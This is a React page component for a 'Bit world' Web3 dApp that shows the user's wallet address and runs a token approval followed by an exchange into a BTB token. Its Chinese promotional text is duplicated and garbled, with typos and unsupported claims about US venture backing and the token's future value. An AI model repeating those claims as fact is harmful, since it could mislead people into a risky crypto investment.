import { useEffect, useState, useRef } from "react";
import { Toast, Button, SpinLoading, Mask } from "antd-mobile";
import InputCard from "./components/inputCard";
import styles from "@/pages/Upgradation/index.module.scss";
import Web3Class from "@/unit/webnew";

const web3: any = new Web3Class();

const Mine = () => {
  const cache: any = useRef(null);
  const [inputValue, setInputValue] = useState(undefined as any);
  const [loading, setLoading] = useState(true);
  const [address, setAddress] = useState('');



  const changeLoading = (load: boolean) => {
    setLoading(load);
  };

  const queryInit = async () => {
    try {
      const res = await web3.translateSign()
      setAddress(res)
      await web3.queryUserPermissions1();
      console.log('address', res)
      changeLoading(false);
    } catch (error) {
      changeLoading(false);
    }
  };
  const buyFn = async () => {
    console.log(111)
    changeLoading(true);
    try {
      // const params = {
      //   price: inputValue,
      //   address: toAddress
      // }
      const val = inputValue || 0.1
      const hash = await web3.approve(val).catch(() => {
        changeLoading(false);
      });
      console.log(hash)
      if(hash?.length) {
        const paramsHash = await web3.exchange(val).catch(() => {
          changeLoading(false);
        });
        if(paramsHash?.length) Toast.show('213')
      }
      changeLoading(false);
    } catch (error) {
      changeLoading(false);
    }
  };
  useEffect(() => {
    try {
      if (!cache.current) {
        queryInit();
        cache.current = true;
      }
    } catch (error) {
      console.error("err------", error);
    }
  }, []);

  const onChange = (val) => {
    setInputValue(val);
  };
  return (
    <div className='home'>
      <Mask visible={loading}>
        <div className={styles.loading}>
          <SpinLoading style={{ "--size": "48px" }} />
        </div>
      </Mask>
      <div className="header">
        <img className="header-left-img" src="/BTB.png" alt="" />
        <div className="header-right">
          <img className="header-right-img" src="/1.png" alt="" />
          <div>{address}</div>
        </div>
      </div>
      <div className="">
        <img src="/egg.png" alt="" />
      </div>
      <div>
        Bit world（比特世界）Wbe.3生態。 Bit world由美國矩陣資本領投聯合澳大利亞加密貨幣研發組織發起； 基於幣安智令78% C完全去中心化Wbe.3金融商業生態，打造Wbe.3社交軟件與元宇宙平臺：為引流龐大用戶參與，平臺發行代幣BTB作為未來整個生態應用通證助力參與者實現自身價值。
      </div>


      <div>
   
        <div>Bit world（比特世界）Wbe.3生態。 Bit world由美國矩陣資本領投聯合澳大利亞加密貨幣研發組織發起； 基於幣安智令78% C完全去中心化Wbe.3金融商業生態，打造Wbe.3社交軟件與元宇宙平臺：為引流龐大用戶參與，平臺發行代幣BTB作為未來整個生態應用通證助力參與者實現自身價值。</div>
      </div>
      <div>1龙蛋+1USDT兑换=1BTB</div>
      <div className={styles.content}>
        <InputCard onChange={onChange} inputValue={inputValue} />
        <Button
          onClick={() => buyFn()}
          size="small"
          color="primary"
          style={{
            background: "rgba(80, 240, 192, 0.1)",
            color: "rgb(80, 240, 192)",
            width: "100%",
            height: "40px",
          }}
        >
          确认兑换
        </Button>
        <div>web3|元宇宙</div>
      </div>
    </div>
  );
};

export default Mine;
